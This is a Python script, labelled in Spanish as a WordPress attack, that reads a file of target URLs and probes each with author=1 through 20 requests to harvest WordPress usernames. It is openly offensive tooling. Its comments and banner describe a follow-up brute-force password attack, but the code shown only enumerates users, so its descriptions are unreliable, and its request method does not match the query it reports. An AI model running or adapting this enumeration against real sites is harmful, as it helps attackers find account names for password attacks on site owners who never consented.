#/usr/bin/env python
# -*- coding: utf-8 -*
###############################################
# Ataque a WORD PRESS                         #
###############################################

###############################################
# Importamos modulos                          #
##############################################
import sys
import os
from termcolor import colored
from urllib import request
import urllib.parse

####################################################
# Se borra las pantalla
####################################################
def borrarPantalla():
    if os.name == "posix":
        os.system ("clear")
    elif os.name == "ce" or os.name == "nt" or os.name == "dos":
        os.system ("cls")

####################################################
# Se valida que el fichero existe en el directorio #
# y ademas que el fichero no esta vacio            #
####################################################
def validarFichUrl(fileEnt):
    name_dirEnt =os.path.join(os.path.dirname(__file__),'FichEnt')

    if not os.path.isdir(name_dirEnt):
        print(colored("[-] El directorio no existe, verificar directorio FichEnt",'red',attrs=['bold']))
        exit()

    else:
        name_file = os.path.join(name_dirEnt,fileEnt)

        if not os.path.isfile(name_file):
            print(colored("[-] El fichero de URLs NO EXISTE ,por favor verifique directorio y nombre de fichero",'red',attrs=['bold']))
            exit()
        elif os.stat(name_file).st_size==0:
            print(colored("[-]El fichero: URLWP.txt, de posibles URL esta vacio, en directorio FichEnt",'red',attrs=['bold']))
            exit()

    return name_file

####################################################
# Se lee el fichero de entrada con cada una de las #
# posibles urls para ver si son vulnerables        #
# a word press                                     #
####################################################
def LeerFichUrl(Fich_Ent_Url):
    leerFichUrl=open(Fich_Ent_Url,'r',encoding='utf-8-sig').readlines()
    leerFichPFinal=(urlwp.strip().rstrip() for urlwp in leerFichUrl)

    return leerFichPFinal

############################################
# Buscamos si la url es vulnerabla en su   #
# su servicio wordpress y muestra usuarios #
# wordpress,si obtiene usuarios maximo 20  #
# busca mediante fuerza bruta passwords    #
# de ese usuario                           #
############################################
def accesoWP(urlvictima):

    contUsuWP=0
    listUsu=[]
    Encontrado=False
    print(colored('************************************************','green',attrs=['bold']))
    print(colored('Analizando URL: ','green',attrs=['bold']),colored(urlvictima,'cyan',attrs=['bold']))
    print(colored('************************************************','green',attrs=['bold']))

    for i in range(1,21):

        datoValor = urllib.parse.urlencode({'author': str(i)})
        datoValor = datoValor.encode('ascii')

        try:
            req = request.Request(urlvictima , headers={'User-Agent': 'My User Agent 1.0' })
            respuesta=request.urlopen(req,datoValor)

            #Validamos si la respuesta ha sido correcta

            if respuesta.code ==200:

                datosRespuesta=respuesta.read().decode('utf-8')

                try:
                    text = datosRespuesta.split('/author/')[1]

                    usuario=text.split('/')[0]
                    print(colored('[+]URL: ' + urlvictima + ' con wordpress vulnerable a /?author=' + str(i),'green',attrs=['bold']))
                    #print(colored('Usuario WORDPRESS author=' + str(i) + ' es: ', 'green',attrs=['bold']), colored(usuario,'cyan',attrs=['bold']))
                    contUsuWP=contUsuWP + 1
                    listUsu.append(usuario)
                    Encontrado=True

                except:
                    print(colored('[-] URL: ' + urlvictima + ' Sin usuario wordpress visible','red',attrs=['bold']))
                    print('                                                                            ')
                    break

        except urllib.error.HTTPError as e:
                print(colored('[-] error HTTPError: ' + str(e),'red',attrs=['bold']))
                print('                                                               ')
                break
        except urllib.error.URLError as e :
                print(colored('error URLError: ' + str(e),'red',attrs=['bold']))
                print('                                                                ')
                break

    if Encontrado:
        print('                                                                                        ')
        print(colored('**************************************************************************','green',attrs=['bold']))
        print(colored('URL: ','green',attrs=['bold']),colored(urlvictima,'cyan',attrs=['bold']))
        print(colored('Numero usuarios WORDPRESS encontrados: ','green',attrs=['bold']),colored(contUsuWP,'cyan',attrs=['bold']))
        print(colored('Usuarios WORDPRESS encontrados: ','green',attrs=['bold']),colored(listUsu,'cyan',attrs=['bold']))
        print(colored('**************************************************************************','green',attrs=['bold']))
        print('                                                                                        ')

########################################################
# se realiza ataque sobre wp para ellos de accede a    #
# si la url del fichero de entrada tiene un gestor de  #
# wp, se busca si es vulnerable, si lo es y se puede   #
# obtener el usuario de wp,se realzia un ataque por    #
# fuerza bruta utilizando un fichero de passwords      #
########################################################
def WpFb():
    borrarPantalla()

    print(colored("*******************************************",'green',attrs=['bold']))
    print(colored("    ATAQUE FUERZA BRUTA SOBRE WORDPRESS    ",'green',attrs=['bold']))
    print(colored("*******************************************",'green',attrs=['bold']))
    print('                                                           ')

    valFichUrl=validarFichUrl('URLWP.txt')
    regFichUrl=LeerFichUrl(valFichUrl)

    for ulrWpVictima in regFichUrl:
        accesoWP(ulrWpVictima)
